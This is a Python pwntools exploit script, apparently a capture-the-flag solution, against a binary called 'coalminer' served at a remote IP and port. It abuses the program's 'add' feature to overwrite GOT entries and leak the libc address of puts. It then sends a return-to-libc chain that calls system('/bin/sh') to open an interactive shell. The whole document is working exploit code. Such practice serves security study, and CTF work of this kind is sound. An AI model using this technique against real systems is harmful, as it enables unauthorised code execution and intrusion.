from pwn import *

e = ELF("./coalminer")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("161.35.8.211", 9999)
else:
  p = process(e.path)

def add(name, desc="AAAA"):
  p.sendlineafter(">", "add")
  p.sendlineafter(":", name)
  p.sendlineafter(":", desc)

debug()

safe = 0x0000000000602000 + 0x100

add((
  "\x00" * 8 + p64(e.got["puts"]) + "\x00" * 8 + p64(e.got["__stack_chk_fail"])
).ljust(0x200, "\x00") + p64(1), p64(0x400b85))

p.sendlineafter(">", "print")
p.recvuntil("\t")
p.recvuntil("\t")

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]

print(hex(leak))

add("A", "A" * 0x28 + p64(0x400bf3) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"]))

p.interactive()
